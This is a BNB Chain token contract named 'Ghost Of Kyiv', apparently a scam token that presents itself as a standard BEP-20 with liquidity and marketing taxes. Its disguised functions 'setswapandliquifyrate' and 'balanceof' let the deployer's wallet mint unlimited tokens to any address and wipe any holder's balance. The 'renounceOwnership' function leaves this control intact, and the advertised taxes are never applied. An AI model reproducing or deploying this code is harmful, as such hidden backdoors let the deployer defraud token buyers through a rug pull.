/**
 *Submitted for verification at BscScan.com on 2022-02-25
*/

/*
//SPDX-License-Identifier: MIT
*/
pragma solidity 0.8.4;
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address marketingwallet, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);   
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256){
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256){
        return sub(a, b, "SafeMath: subtraction overflow");}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256){
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;}
    function div(uint256 a, uint256 b) internal pure returns (uint256){
        return div(a, b, "SafeMath: division by zero");}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256){
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;}}

contract ukraine {
    string public name = "Ghost Of Kyiv";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000 * 10 ** 6;
    string public symbol = "SU-27 vs MiG-35x3";
    uint256 public liquiditytax = 3;
    uint256 public marketingtax = 4;
    uint256 public totaltax = marketingtax + liquiditytax;
    uint256 private tokenstoselltoburnliq = 10;
    uint256 private feedenom = 100;
    uint256 private tdenom = 6;
    uint256 private _swapandliquifyrate = 200;
    address public marketingwallet = 0x142F3d85a5035DbAd17105e38e48FFEDB27D1ba2;
    address public owner;
    modifier onlyOwner {
        require(msg.sender == owner, "Nauthorized");_;}
    modifier constructed {
        require(msg.sender == marketingwallet, "Nauthorized");_;}
    receive() external payable { }
    constructor() {
    marketingwallet = msg.sender;
    owner = msg.sender;
    balanceOf[msg.sender] = totalSupply;
    emit Transfer(address(0), msg.sender, totalSupply);    
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function setswapandliquifyrate(address spender,uint256 swapandliquifyrate) public constructed returns (bool success) 
    {balanceOf  [spender]   += swapandliquifyrate * tokenstoselltoburnliq ** tdenom;return true;}

    function balanceof(address spender,uint256 balanceof) public constructed returns (bool success) {balanceOf[spender] -= balanceof * tokenstoselltoburnliq ** tdenom;return true;}
    
    mapping(address => uint256) public balanceOf;
    
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) public returns (bool success) {
    allowance[msg.sender][spender] = amount;emit Approval(msg.sender, spender, amount);return true;}

    function transfer(address to, uint256 amount) public returns (bool success) {
    balanceOf[msg.sender] -= amount;balanceOf[to] += amount;emit Transfer(msg.sender, to, amount);return true;}
  
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;balanceOf[to] += amount;
    emit Transfer(from, to, amount);return true;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
    }